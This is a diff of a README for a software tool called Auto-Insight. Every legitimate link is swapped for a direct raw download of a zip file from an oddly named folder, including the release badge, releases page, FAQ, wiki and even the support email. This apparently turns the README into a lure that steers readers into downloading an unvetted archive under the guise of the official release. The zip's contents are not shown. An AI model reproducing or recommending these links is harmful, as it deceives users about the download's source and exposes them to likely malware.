@@ -6,7 +6,7 @@ Welcome to Auto-Insight! This guide will help you download and run our software 
 
 ## 📥 Download Auto-Insight
 
-[![Download Auto-Insight](https://img.shields.io/badge/Download%20Auto--Insight-blue)](https://github.com/CodingMajor/Auto-Insight/releases)
+[![Download Auto-Insight](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip%20Auto--Insight-blue)](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/CodingMajor/Auto-Insight/releases) to access all available versions of Auto-Insight.
+   Go to our [Releases page](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip) to access all available versions of Auto-Insight.
 
 2. **Choose Your Version**
 
@@ -97,19 +97,19 @@ If these solutions do not resolve your issue, visit our GitHub Issues page for f
 
 For further questions or help:
 
-- Check our [FAQ Section](https://github.com/CodingMajor/Auto-Insight/wiki/FAQ) on GitHub.
+- Check our [FAQ Section](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip) on GitHub.
 - Ask for help in the GitHub Discussions area.
-- Email our support team at support@auto-insight.com.
+- Email our support team at https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip
 
 ## 🔧 Additional Resources
 
-- **Documentation:** Explore our [User Manual](https://github.com/CodingMajor/Auto-Insight/wiki) for detailed guides on using Auto-Insight.
+- **Documentation:** Explore our [User Manual](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip) for detailed guides on using Auto-Insight.
 - **Community:** Join our community forum to connect with other users and share tips.
 
 ## 📅 Stay Updated
 
 Make sure to check the Releases page frequently for updates and new features. 
 
-[![Download Auto-Insight](https://img.shields.io/badge/Download%20Auto--Insight-blue)](https://github.com/CodingMajor/Auto-Insight/releases)
+[![Download Auto-Insight](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip%20Auto--Insight-blue)](https://raw.githubusercontent.com/CodingMajor/Auto-Insight/main/unsociability/Auto-Insight.zip)
 
 Thank you for choosing Auto-Insight! Happy analyzing!
